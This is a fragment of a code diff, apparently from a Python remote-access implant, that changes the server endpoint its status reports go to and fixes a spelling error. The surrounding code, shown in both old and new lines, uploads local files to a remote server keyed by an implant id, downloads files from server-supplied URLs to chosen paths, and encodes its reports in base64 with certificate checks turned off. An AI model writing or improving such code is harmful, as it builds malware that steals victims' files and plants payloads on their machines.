@@ -44,7 +44,7 @@ while True:
 				multipart_form_data = {
    				'data': (str(filenamedl).strip(), open(filedl, 'rb')),
 				}
-				tellme = requests.get(url + "/up.php?res=" + base64_messagedl + "&id="+uid, verify=False)
+				tellme = requests.get(url + "/res.php?res=" + base64_messagedl + "&id="+uid, verify=False)
 				gimme = requests.post(url + "/up.php?id="+uid, files=multipart_form_data , verify=False)
 			
 			
@@ -55,11 +55,11 @@ while True:
 				path =  str(lines.split(":",5)[-1]).strip()
 				print(urldl)
 				print(path)
-				messagedl = "Dowwloading "+ str(urldl) + " to "+ path
+				messagedl = "Downloading "+ str(urldl) + " to "+ path
 				messagedl_bytes = messagedl.encode('ascii')
 				base64_bytes = base64.b64encode(messagedl_bytes)
 				base64_messagedl = base64_bytes.decode('ascii')
-				tellme = requests.get(url + "/up.php?res=" + base64_messagedl + "&id="+uid, verify=False)
+				tellme = requests.get(url + "/res.php?res=" + base64_messagedl + "&id="+uid, verify=False)
 				takethis = requests.get(urldl, verify=False)
 				with open(path, 'wb') as f:
     					f.write(takethis.content)
